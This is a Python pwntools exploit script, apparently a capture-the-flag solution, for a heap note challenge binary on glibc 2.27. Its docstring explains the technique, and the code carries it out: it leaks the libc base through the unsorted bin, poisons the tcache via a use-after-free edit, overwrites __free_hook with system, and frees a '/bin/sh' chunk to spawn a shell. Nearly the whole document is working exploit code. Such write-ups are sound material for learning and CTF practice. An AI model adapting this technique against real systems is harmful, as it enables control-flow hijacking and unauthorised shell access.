#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C2 - unsorted bin libc leak -> tcache poisoning -> __free_hook -> system
=======================================================================
Target  : ./heapnote  (glibc 2.27, -no-pie, partial RELRO)
Goal    : leak libc base, then overwrite __free_hook with system and free
          a chunk whose data is "/bin/sh" -> system("/bin/sh").
Leak    : unsorted bin fd = main_arena + 96.

The leak
--------
* tcache only serves chunk sizes 0x20..0x410. A request >= 0x418 makes a
  0x420 chunk that tcache does NOT hold; on free() it goes to the UNSORTED
  BIN (we keep a guard chunk after it so it does not merge into top).
* A freed unsorted-bin chunk's fd/bk point at the bin head, whose "chunk"
  address is main_arena + 96 (0x60) on 2.27 x86-64.
* main_arena sits right after __malloc_hook:  main_arena = __malloc_hook + 0x10.
  So:   libc_base = leak - (__malloc_hook + 0x10) - 96.
  We read every offset from the shipped libc at runtime, so the script is
  robust across 2.27-3ubuntu1.x sub-versions.

The write (tcache poisoning via UAF-Edit)
-----------------------------------------
* Free two same-size tcache chunks -> counts=2, head = last_freed -> first.
* UAF-Edit the HEAD chunk's fd to __free_hook (the bug: notes[] not NULLed).
* malloc #1 returns the head; malloc #2 returns __free_hook; write system.
* Allocate a chunk containing "/bin/sh" and free it -> system("/bin/sh").

Run
---
    cd challenges && python3 c2_unsorted_leak/exp.py
"""

from pwn import *

context.binary = exe = ELF("./heapnote")
libc = ELF("./glibc-2.27/libc-2.27.so")
context.log_level = "info"

p = process("./heapnote")

# ---- menu helpers -----------------------------------------------------------
def add(idx: int, size: int, data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def delete(idx: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx: int, length: int, data: bytes):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    p.sendafter(b"data: ", data)

def show(idx: int) -> bytes:
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"data=")
    # the program writes exactly notes[idx]->size bytes then a newline
    line = p.recvuntil(b"\n", drop=True)
    return line

# ===========================================================================
# STAGE 1 - leak libc base via the unsorted bin
# ===========================================================================
# 0x418 request -> 0x420 chunk -> NOT tcache -> unsorted bin on free.
BIG = 0x418
add(0, BIG, b"A" * 8)        # chunk we will free into unsorted bin
add(1, 0x18, b"GUARD")       # guard so chunk 0 does not merge into top
delete(0)                    # -> unsorted bin; fd/bk = main_arena+96

leak_raw = show(0)           # UAF-read: prints 8 bytes of the freed chunk's data
leak = u64(leak_raw[:8].ljust(8, b"\x00"))
log.info("unsorted bin fd leak = %#x", leak)

main_arena = libc.symbols["__malloc_hook"] + 0x10
libc.address = leak - main_arena - 96
log.success("libc base = %#x", libc.address)

system = libc.symbols["system"]
free_hook = libc.symbols["__free_hook"]
binsh = next(libc.search(b"/bin/sh\x00"))
log.info("system      = %#x", system)
log.info("__free_hook = %#x", free_hook)
log.info("/bin/sh     = %#x", binsh)

# ===========================================================================
# STAGE 2 - tcache poisoning (UAF-Edit vector) -> __free_hook = system
# ===========================================================================
# Use a 0x68 request -> 0x70 chunk (tcache bin; comfortable, avoids fastbins).
SZ = 0x68
add(2, SZ, b"X" * 8)
add(3, SZ, b"Y" * 8)
delete(2)                    # counts=1, head=2
delete(3)                    # counts=2, head=3 -> 2  (LIFO)
# UAF-Edit the HEAD (note 3): overwrite its fd with __free_hook.
edit(3, 8, p64(free_hook))
log.info("poisoned head's fd -> __free_hook")

add(4, SZ, b"PAD")           # malloc #1: returns chunk-3, head -> __free_hook
add(5, SZ, p64(system))      # malloc #2: returns __free_hook, write system
log.success("__free_hook = system")

# ===========================================================================
# STAGE 3 - trigger: free a chunk whose data is "/bin/sh"
# ===========================================================================
add(6, SZ, b"/bin/sh\x00")
delete(6)                    # free(ptr) -> __free_hook(ptr) -> system("/bin/sh")
log.success("shell popped")

p.interactive()
